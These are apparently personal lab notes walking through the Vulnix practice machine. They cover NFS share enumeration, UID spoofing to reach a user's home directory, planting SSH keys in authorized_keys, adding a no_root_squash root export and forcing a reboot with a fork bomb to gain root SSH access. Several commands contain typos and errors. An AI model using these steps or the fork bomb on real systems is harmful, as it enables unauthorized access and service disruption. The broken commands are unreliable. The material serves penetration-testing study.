Get a list of shared folders:
```
showmount -e <targetIP>
```

Example Outout:
```
/homevulnix
```

Here you can assume the username is vulnix. My try to figure out what the UID is.
Try to trick the system into giving us this. Do the following
```
sudo mkdir /mnt/vulnix
sudo mount <targetIP>:/home/vulnix /mnt/vulnix
```

Try to see the contense.
```
ls -lah /mnt/vulnix
```

You might get a access denied error
```
┌──(digit㉿kali)-[~/Documents/Labs/Vulnix]
└─$ sudo ls -lah /mnt/vulnix   
ls: cannot open directory '/mnt/vulnix': Permission denied
```

Have a look at the folder permissions:
```
ls -lah /mnt/vulnix
```
You will seee that the group is nobody, therefore you might have issues accessing the share

Try mounting with these options to get the user id (UID)

```
# First unmount the share:
umount /mnt/vulnix
sudo mount <targetIP>:/home/vulnix /mnt/vulnix -o vers=3
```

-o => OS
vers=3 => Version 3

Now try again and have a look at the user's shares:
```
ls -lah /mnt/vulnix
```

```
┌──(digit㉿kali)-[~/Documents/Labs/Vulnix]
└─$ sudo mount 10.50.10.77:/home/vulnix /mnt/vulnix -o vers=3
Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.

┌──(digit㉿kali)-[~/Documents/Labs/Vulnix]
└─$ ls -lah /mnt               
total 12K
drwxr-xr-x  3 root root 4.0K Jun 29 14:01 .
drwxr-xr-x 19 root root 4.0K Jun 28 00:28 ..
drwxr-x---  2 2008 2008 4.0K Sep  2  2012 vulnix                   
```

Above, you will notice the user id and group id of 2008.
We can now try to create a local user with the userID of 2008 and the username of vulnix (We know the username is vulnix because we enumerated it using other services, e.g.: smb, SMTP, etc.)

```
sudo adduser -u 2008 vulnix              
[sudo] password for digit:    <= You sudo password
New password:  <= select any password here, e.g, the username if you want to
Retype new password: 
passwd: password updated successfully
Changing the user information for vulnix
Enter the new value, or press ENTER for the default
	Full Name []: 
	Room Number []: 
	Work Phone []: 
	Home Phone []: 
	Other []: 
Is the information correct? [Y/n] y
```

Now su to the user and try to access the shares:
```
┌──(digit㉿kali)-[~/Documents/Labs/Vulnix]
└─$ su vulnix                  
Password: <= Password you specified in the previous step
┌──(vulnix㉿kali)-[/home/digit/Documents/Labs/Vulnix]
└─$ ls -lah /mnt/vulnix/
total 20K
drwxr-x--- 2 vulnix vulnix 4.0K Sep  2  2012 .
drwxr-xr-x 3 root   root   4.0K Jun 29 14:01 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3.5K Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
```

Now that you have access to the folder, we can load our SSH keys into it. 
#### ALSO SEE "Tool Usage > SSH > Public & Private keys"

# Generating SSH Keys for the share

Still using the vulnix user when doing this:
```
mkdir /mnt/vulnix/.ssh
```

```
ssh-keygen -t ssh-rsa
```

-t ssh-rsa => Need to use this as older boxes still makes use of this.

Next, copy your public key to the authorized_keys file
```
cp /home/vunix/.ssh/rsa.pub /mnt/vulnix/.ssh/authorized_keys
```

You should be able to SSH the box using the vulnix user
```
ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i /homr/vulnix.ssh.rsa vulnix@<targetIP>
```

# Add root share to NFS
If you have modifcation access to "/etc/exports", you can try to mount the /root folder
```
sudoedit /etc/exports
```

Add the root share:
Add the follwing:
```
/root  *(rw,no_root_squash)
```

For it to take affect, the service needs to be restarted or the server needs to be rebooted.
You can do a "Fork Bomb". ** Be careful as this will bounce the box.
_Linux Fork bombs_ operate both by consuming CPU time in the process of forking, and by saturating the operating system's process table.
Command:
```
:(){ :|:& };:
```

Once the share is aviable, we can check and mount it
```
shouwmount -e <targetIP>
mkdir /mnt/vulnixroot
sudo mount <targetIP>:/root /mnt/vulnixroot -o vers=3
```

Check the condense of the file:
```
sudo ls -lash /mnt/vulnixroot
```

# Gaining root shell access:
Follow the above steps to generate a root .ssh public keys, copy it to the share as before then ssh to the target box:
```
sudo -o "PubkeyAcceptKeyType +ssh-rsa" -i /root/.ssh/id_rsa root@<targetBox>
```
